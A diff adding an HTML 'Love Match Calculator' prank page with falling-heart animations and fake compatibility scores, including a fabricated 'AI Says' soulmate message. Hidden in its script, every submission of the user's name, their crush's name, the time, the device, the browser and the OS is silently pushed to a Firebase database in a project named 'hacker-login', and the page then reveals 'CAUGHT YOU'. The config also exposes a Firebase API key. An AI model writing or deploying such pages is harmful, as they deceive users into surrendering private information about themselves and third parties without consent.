@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Love Match Calculator 💘</title>
+  <link href="https://fonts.googleapis.com/css2?family=Dancing+Script&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      font-family: 'Dancing Script', cursive;
+      background: linear-gradient(to right, #ffdee9, #b5fffc);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    h1 {
+      color: #ff1493;
+      font-size: 3em;
+      margin-bottom: 10px;
+    }
+
+    input {
+      padding: 10px;
+      font-size: 1.2em;
+      margin: 10px;
+      border-radius: 10px;
+      border: 2px solid #ff69b4;
+    }
+
+    button {
+      padding: 10px 20px;
+      font-size: 1.2em;
+      background: #ff1493;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+
+    #result, #caught, #crushReveal, #fakeAI {
+      margin-top: 20px;
+      font-size: 1.5em;
+      color: #ff1493;
+      display: none;
+      animation: fadeIn 1s ease-in-out forwards;
+    }
+
+    @keyframes fadeIn {
+      0% {opacity: 0; transform: translateY(20px);}
+      100% {opacity: 1; transform: translateY(0);}
+    }
+
+    .heart {
+      position: fixed;
+      width: 20px;
+      height: 20px;
+      background-color: pink;
+      transform: rotate(45deg);
+      animation: fall 4s linear infinite;
+    }
+
+    .heart::before,
+    .heart::after {
+      content: "";
+      position: absolute;
+      width: 20px;
+      height: 20px;
+      background-color: pink;
+      border-radius: 50%;
+    }
+
+    .heart::before {
+      top: -10px;
+      left: 0;
+    }
+
+    .heart::after {
+      left: -10px;
+      top: 0;
+    }
+
+    @keyframes fall {
+      0% { top: -10px; opacity: 1; }
+      100% { top: 100vh; opacity: 0; }
+    }
+  </style>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "AIzaSyA9SDmpeyc5k9iraz8KXlZD4wRXGYSM1_w",
+      authDomain: "hacker-login-5da91.firebaseapp.com",
+      databaseURL: "https://hacker-login-5da91-default-rtdb.firebaseio.com",
+      projectId: "hacker-login-5da91",
+      storageBucket: "hacker-login-5da91.firebasestorage.app",
+      messagingSenderId: "1046375390326",
+      appId: "1:1046375390326:web:56c01ddefd415b045d1357",
+      measurementId: "G-614SQHSVQD"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      const device = /mobile/i.test(ua) ? "Mobile" : "Desktop";
+      const browser = navigator.userAgentData?.brands?.[0]?.brand || navigator.appName;
+      const os = navigator.platform;
+      return { device, browser, os };
+    }
+  </script>
+</head>
+<body>
+  <h1>💘 Love Match Calculator 💘</h1>
+  <input type="text" id="yourName" placeholder="Your Name">
+  <input type="text" id="crushName" placeholder="Your Crush's Name">
+  <br>
+  <button onclick="calculateLove()">Find Match 🔮</button>
+
+  <div id="result"></div>
+  <div id="fakeAI"></div>
+  <div id="caught"></div>
+  <div id="crushReveal"></div>
+
+  <audio id="loveSound" src="https://files.catbox.moe/rr4zdr.mp3"></audio>
+
+  <script>
+    function createHearts() {
+      const heart = document.createElement('div');
+      heart.classList.add('heart');
+      heart.style.left = Math.random() * 100 + "vw";
+      heart.style.animationDuration = Math.random() * 2 + 3 + "s";
+      document.body.appendChild(heart);
+      setTimeout(() => heart.remove(), 5000);
+    }
+    setInterval(createHearts, 300);
+
+    function calculateLove() {
+      const yourName = document.getElementById('yourName').value.trim();
+      const crushName = document.getElementById('crushName').value.trim();
+      const result = document.getElementById('result');
+      const caught = document.getElementById('caught');
+      const crushReveal = document.getElementById('crushReveal');
+      const fakeAI = document.getElementById('fakeAI');
+      const sound = document.getElementById('loveSound');
+
+      if (!yourName || !crushName) {
+        alert("Please enter both names!");
+        return;
+      }
+
+      result.style.display = 'none';
+      caught.style.display = 'none';
+      crushReveal.style.display = 'none';
+      fakeAI.style.display = 'none';
+
+      result.innerHTML = `🔍 Scanning the cosmos...`;
+      result.style.display = 'block';
+
+      const deviceInfo = getDeviceInfo();
+
+      db.ref("loveLogs").push({
+        yourName: yourName,
+        crushName: crushName,
+        time: new Date().toLocaleString(),
+        device: deviceInfo.device,
+        browser: deviceInfo.browser,
+        os: deviceInfo.os
+      });
+
+      setTimeout(() => {
+        result.innerHTML = `🔥 FLAMES Result: <b>Love</b><br>🌌 Astrology Match: <b>Perfect Pair 💕</b><br>❤️ Compatibility Score: <b>${Math.floor(Math.random() * 21) + 80}%</b>`;
+        fakeAI.innerHTML = `🤖 AI Says: \"Your heartbeats sync at 92% frequency. Soulmate alert! 💞\"`;
+        fakeAI.style.display = 'block';
+        sound.play();
+      }, 2500);
+
+      setTimeout(() => {
+        caught.innerHTML = `💥 CAUGHT YOU 💥`;
+        caught.style.display = 'block';
+      }, 5000);
+
+      setTimeout(() => {
+        crushReveal.innerHTML = `😏 You like <span style=\"color: hotpink; text-shadow: 1px 1px 2px red;\">${crushName}</span>!`;
+        crushReveal.style.display = 'block';
+      }, 6000);
+    }
+  </script>
+</body>
+</html>
